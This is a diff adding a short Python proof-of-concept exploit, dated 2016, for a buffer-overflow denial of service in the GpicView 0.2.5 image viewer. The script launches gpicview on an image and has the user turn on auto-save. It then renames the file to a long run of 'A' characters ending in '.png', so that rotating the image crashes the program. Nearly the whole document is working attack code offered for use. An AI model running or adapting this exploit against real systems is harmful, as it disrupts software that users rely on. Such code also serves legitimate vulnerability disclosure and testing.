@@ -1,0 +1,48 @@
+#!/usr/bin/python
+# Exploit Title: GpicView Buffer Overflow DOS
+# Date: 25th February 2016
+# Exploit Author: David Silveiro (Xino.co.uk)
+# Vendor Homepage: lxde.sourceforge.net/gpicview/
+# Software Link: https://sourceforge.net/projects/lxde/files/GPicView%20%28image%20Viewer%29/0.2.x/
+# Version: 0.2.5
+# Tested on: Ubuntu 14 LTS
+# CVE : 0 day
+
+#Example: python POC.py [image-file]
+
+from sys        import argv
+from subprocess import Popen
+from shlex      import split
+from time       import sleep
+import shutil
+
+def DOS(arg):
+                                          #"""------------------------------------"""#
+    command    = 'gpicview ' + arg[1]     #'''   Recieve file & construct Popen   '''#
+    command_2  = split(command)           #"""------------------------------------"""#
+                                          #"|"                                    "|"#
+    Popen(command_2)                      #"""      Open file with Gpicview       """#
+                                          #"""------------------------------------"""#
+    print("Required: You have 15 seconds")
+    print("to click on preferences, and ") 
+    print("check 'Auto Save Images'     ")         
+   
+    sleep(15) 
+                                          #"""------------------------------------"""#
+    buffer = 'A' * 70 + '.png'            #"|"      Rename image with Buffer      "|"#
+    shutil.move(arg[1], buffer)           #"""------------------------------------"""#
+
+def main():
+
+    print("Author:   David Silveiro   ")
+    print("Company:  Xino.co.uk       ")
+    print("   POC Gpicview DOS        ")
+
+    DOS(argv)
+
+    print("File ready for overflow    ")
+    print("Now simply rotate the image")
+
+
+if __name__ == "__main__":
+   main()
